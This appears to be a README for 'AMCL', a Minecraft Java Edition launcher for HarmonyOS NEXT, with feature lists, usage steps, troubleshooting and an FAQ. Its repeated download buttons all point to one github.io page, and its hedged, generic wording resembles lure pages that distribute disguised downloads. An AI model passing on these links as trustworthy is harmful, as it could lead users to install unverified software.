# AMCL v1.0.0-alpha.1 - Loader and Update Utility 2026

> **AMCL sets up a Minecraft Java Edition launch stack for HarmonyOS NEXT devices, handling runtime choice, graphics and audio integration, account login routes, and the bootstrap work required before the game starts.**

[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-HarmonyOS%20NEXT-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/logan-rossct3464/amcl-loader-update-utility?style=flat-square)](https://github.com/logan-rossct3464/amcl-loader-update-utility)

---

<p align="center">
  <a href="https://logan-rossct3464.github.io/amcl-loader-update-utility/">
    <img src="https://img.shields.io/badge/Download-AMCL%20Loader-brightgreen?style=for-the-badge" alt="Download AMCL Loader">
  </a>
</p>

> **[Direct Download - AMCL Loader](https://logan-rossct3464.github.io/amcl-loader-update-utility/)**

---

[Download Latest Build](https://logan-rossct3464.github.io/amcl-loader-update-utility/)

---

## Overview

AMCL is a mobile launcher built for Minecraft Java Edition on HarmonyOS NEXT. It packages the moving parts needed to bring the game up on supported devices, including OpenJDK runtimes, a custom ELF loader, a GLFW-to-XComponent bridge, MobileGlues rendering support, and OpenAL Soft for audio. It also offers Microsoft account sign-in and offline account access, so different player workflows can be handled inside the same launcher.

When you start a game, AMCL picks a JDK that matches the Minecraft version and prepares the runtime layer before transferring control to the game itself. The intent is to cut down on manual on-device setup by shipping the Java Edition dependencies Minecraft expects and integrating them through ArkTS-based launcher logic for the HarmonyOS NEXT environment.

---

## Core Capabilities

- Built for HarmonyOS NEXT with a launcher flow oriented around mobile devices
- Starts Minecraft Java Edition from a packaged launcher environment
- Ships patched OpenJDK runtimes to reduce outside runtime setup
- Automatically chooses a JDK version according to the Minecraft release being launched
- Relies on a custom ELF loader to get native pieces ready during startup
- Provides a GLFW to XComponent compatibility shim for platform integration
- Uses MobileGlues as the rendering translation layer
- Includes OpenAL Soft for audio playback support
- Works with Microsoft login and offline accounts
- Keeps the focus on runtime assembly and device compatibility during launch

---

## Usage

1. Download the latest build from the project download page.
2. Install or unpack it on a HarmonyOS NEXT device.
3. Open AMCL and select the Minecraft Java Edition version you want to launch.
4. Sign in with a Microsoft account or use an offline account if that fits your setup.
5. Start the game and allow AMCL to assemble the correct runtime and native components.

If the project exposes a configuration file or launch profile, a minimal example may look like this:

    {
      "game": "minecraft-java",
      "runtime": "auto",
      "account": "microsoft"
    }

---

## Release Tracks

| Channel | Purpose | Notes |
| --- | --- | --- |
| Latest | Current recommended build | Use this for normal downloads and day-to-day use |
| Alpha | Early development releases | Expect ongoing changes and version-specific adjustments |
| Manual | User-managed installation | Suitable when you want to control the files yourself |

---

## Troubleshooting

- If the launcher will not open, verify that you are on a HarmonyOS NEXT device and that the build matches your environment.
- If a game version does not launch, try another Minecraft Java Edition release, since AMCL chooses runtime parts by game version.
- If account sign-in fails, check the Microsoft login flow again or switch to an offline account for testing.
- If graphics or audio do not come up correctly, make sure the packaged translation and audio layers are included.
- If native loading stops too early, download the build again and confirm the installation files were not interrupted or changed.
- If network-dependent steps fail, retry on a stable connection and confirm that update or login requests can reach their services.
- If the launcher keeps reusing old files, clear local app data or reinstall the package to trigger a clean setup.

---

## FAQ

**Does AMCL update the game automatically?**  
AMCL is centered on preparing and launching the runtime environment. Whether updates happen depends on the build you have and how its release flow is packaged.

**Does it keep local files for launch speed?**  
The launcher bundles the key runtime pieces and may reuse local files as part of its startup workflow.

**Can I switch back to another setup?**  
Yes. You can keep separate installation files or rebuild the launch environment whenever your device management approach requires it.

**Are logs available?**  
If your build includes logs, they can help diagnose runtime selection, login problems, and native loading issues.

**Which accounts are supported?**  
AMCL supports Microsoft login and offline accounts.

**What systems are compatible?**  
This project is aimed at HarmonyOS NEXT devices and is designed around Minecraft Java Edition on mobile hardware.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
